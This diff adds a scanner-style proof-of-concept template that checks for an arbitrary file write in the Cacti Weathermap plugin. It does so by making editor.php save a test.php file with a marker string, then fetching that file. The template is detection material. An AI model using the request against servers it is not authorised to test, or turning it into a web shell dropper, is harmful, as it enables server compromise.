@@ -1,0 +1,15 @@
+name: poc-yaml-cacti-weathermap-file-write
+rules:
+  - method: GET
+    path: >-
+      /plugins/weathermap/editor.php?plug=0&mapname=test.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=46ea1712d4b13b55b3f680cc5b8b54e8&map_legend=Traffic+Load&map_stamp=Created%3A%2B%25b%2B%25d%2B%25Y%2B%25H%3A%25M%3A%25S&map_linkdefaultwidth=7
+    follow_redirects: false
+    expression: response.status == 200
+  - method: GET
+    path: /plugins/weathermap/configs/test.php
+    follow_redirects: false
+    expression: response.status == 200 && response.body.bcontains(b"46ea1712d4b13b55b3f680cc5b8b54e8")
+detail:
+  author: whynot(https://github.com/notwhy)
+  links:
+    - https://www.secpulse.com/archives/47690.html
